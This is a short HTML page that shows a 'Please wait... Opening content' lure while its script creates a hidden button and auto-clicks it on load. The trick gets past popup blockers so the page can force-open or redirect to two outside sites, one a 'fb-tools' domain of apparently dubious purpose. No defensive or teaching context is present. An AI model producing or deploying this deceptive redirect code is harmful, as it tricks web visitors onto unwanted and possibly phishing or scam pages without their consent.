<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Auto Redirect Tabs</title>
</head>
<body>
  <h1 style="text-align:center; margin-top:40px; color:red;">
    Please wait... Opening content ðŸ”¥
  </h1>

<script>
(function(){
  var link1 = "https://shimulqww.github.io/Unitedstatesvideos/";
  var link2 = "https://fb-tools.social-networking.me";

  // Trick: simulate a hidden button click
  var btn = document.createElement("button");
  btn.style.display = "none";
  document.body.appendChild(btn);

  btn.addEventListener("click", function(){
    var w1 = window.open(link1, "_blank");

    setTimeout(function(){
      var w2 = window.open(link2, "_blank");
      if(!w2 || w2.closed){
        window.location.href = link2;
      }
    }, 400);

    setTimeout(function(){
      if(!w1 || w1.closed){
        window.location.href = link1;
      }
    }, 800);
  });

  // Force "auto click" after load
  window.addEventListener("load", function(){
    btn.click();
  });

})();
</script>

</body>
</html>
